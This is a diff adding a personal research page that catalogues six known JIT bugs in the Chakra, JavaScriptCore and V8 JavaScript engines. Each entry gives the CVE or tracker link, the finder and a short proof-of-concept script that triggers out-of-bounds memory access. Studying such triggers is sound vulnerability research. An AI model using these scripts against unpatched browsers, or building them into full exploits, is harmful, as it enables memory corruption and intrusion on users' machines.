@@ -1,0 +1,176 @@
+<html>
+
+<head>
+    <title>zhunki</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body>
+    <div style="min-width: min-content;">
+        <h2 style="text-align: center;">王俊杰</h2>
+        <ul>
+            <li><a href="index.html">Introduction</a></li>
+            <li><a href="publications.html">Publications</a></li>
+            <li><a href="grants.html">Research Grants</a></li>
+            <li><a href="ack.html">Acknowledgements</a></li>
+            <li><a href="reading.html">Paper Reading</a></li>
+            <li><a class="active" href="#">Bug Analysis</a></li>
+        </ul>
+
+        <p>6. Anonymous bug<br>
+            &nbsp;&nbsp; Finder: Zhenhuan Li<br>
+            &nbsp;&nbsp; <a href="https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf">https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf</a><br>
+            <pre><code>function opt(arr, start, end) {
+    for (let i = start; i < end; i++) {
+        if (i === 10) {
+            for(let j=0;j<0;j++)
+                i += 0;
+        }
+        arr[i] = 2.3023e-320;
+    }
+}
+            
+function main() {
+    let arr = new Array(100);
+    arr.fill(1.1);
+            
+    for (let i = 0; i < 1000; i++){
+        opt(arr, 0, 3);
+    }
+      
+    opt(arr, 0, 100000);
+}
+            
+main();</code></pre>
+        </p>
+        <br>
+        <p>5. [CVE-2018-8137]<br>
+            &nbsp;&nbsp; Finder: Zhenhuan Li<br>
+            &nbsp;&nbsp; <a href="https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf">https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf</a><br>
+            <pre><code>function opt(arr, start, end) {
+    for (let i = start; i < end; i++) {
+        if (i === 10) {
+            for(let j=0;j<10;j++)
+                i += 0;
+        }
+        arr[i] = 2.3023e-320;
+    }
+}
+            
+function main() {
+    let arr = new Array(100);
+    arr.fill(1.1);
+            
+    for (let i = 0; i < 1000; i++){
+        opt(arr, 0, 3);
+    }
+      
+    opt(arr, 0, 100000);
+}
+            
+main();</code></pre>
+        </p>
+        <br>
+        <p>4. [CVE-2018-0777] Issue 1429: Microsoft Edge: Chakra: JIT: Loop analysis bug<br>
+            &nbsp;&nbsp; Finder: lokihardt<br>
+            &nbsp;&nbsp; <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1429">https://bugs.chromium.org/p/project-zero/issues/detail?id=1429</a><br>
+            <pre><code>function opt(arr, start, end) {
+    for (let i = start; i < end; i++) {
+        if (i === 10) {
+            i += 0;
+        }
+        arr[i] = 2.3023e-320;
+    }
+}
+            
+function main() {
+    let arr = new Array(100);
+    arr.fill(1.1);
+            
+    for (let i = 0; i < 1000; i++){
+        opt(arr, 0, 3);
+    }
+      
+    opt(arr, 0, 100000);
+}
+            
+main();</code></pre>
+        </p>
+        <br>
+        <p>3. [CVE-2020-9802] Issue 2020: JSC: JIT: Incorrect Common Subexpression Elimination for ArithNegate, leading to OOB accesses<br>
+            &nbsp;&nbsp; Finder: Samuel Groß<br>
+            &nbsp;&nbsp; <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2020">https://bugs.chromium.org/p/project-zero/issues/detail?id=2020</a><br>
+            <pre><code>const ITERATIONS = 1000000;
+
+function f(n) {
+    n &= 0xffffffff;
+    
+    if (n < -1) {
+        let v = (-n)&0xffffffff;
+        let i = Math.abs(n);
+        let arr = new Array(10);
+        arr.fill(42.42);
+        if (i < arr.length) {
+            return arr[i];
+        }
+    }
+}
+            
+for (let i = 0; i < ITERATIONS; i++) {
+    let isLastIteration = i == ITERATIONS - 1;
+    let n = -(i % 10);
+    if (isLastIteration) {
+        n = -2147483648;
+    }
+    f(n);
+}</code></pre>
+        </p>
+        <br>
+        <p>2. Issue 762874: Security: off by one in TurboFan range optimization for String.indexOf<br>
+            &nbsp;&nbsp; Finder: Stephen Röttger<br>
+            &nbsp;&nbsp; <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=762874">https://bugs.chromium.org/p/chromium/issues/detail?id=762874</a><br>
+            <pre><code>function maxstring(){
+    try {} finally {}
+                  
+    var i = 'A'.repeat(2**28 - 16).indexOf("", 2**28);
+    i += 16; // real value: i = 2**28, optimizer: i = 2**28-1
+    i >>= 28; // real value i = 1, optimizer: i = 0
+    i *= 100000; // real value i = 100000, optimizer: i = 0
+    if (i > 3) {
+        return 0;
+    } else {
+        var arr = [0.1, 0.2, 0.3, 0.4];
+        return arr[i];
+    }
+}
+                  
+function opttest() {
+    for (var i=0; i<100000; i++) {
+        var o = maxstring();
+        if (o == 0 || o == undefined) {
+            continue;
+        }
+        return o;
+    }
+    console.log("fail");
+}
+                  
+opttest();</code></pre>
+        </p>
+        <br>
+        <p>1. Issue 880207: Security: incorrect type information on Math.expm1<br>
+            &nbsp;&nbsp; Finder: Stephen Röttger<br>
+            &nbsp;&nbsp; <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=880207">https://bugs.chromium.org/p/chromium/issues/detail?id=880207</a><br>
+            &nbsp;&nbsp; <a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/">https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/</a><br>
+            <pre><code>function foo(){
+    return Object.is(Math.expm1(-0), -0);
+}
+                  
+console.log(foo());
+%OptimizeFunctionOnNextCall(foo);
+console.log(foo());</code></pre>
+        </p>
+    </div>
+</body>
+
+</html>
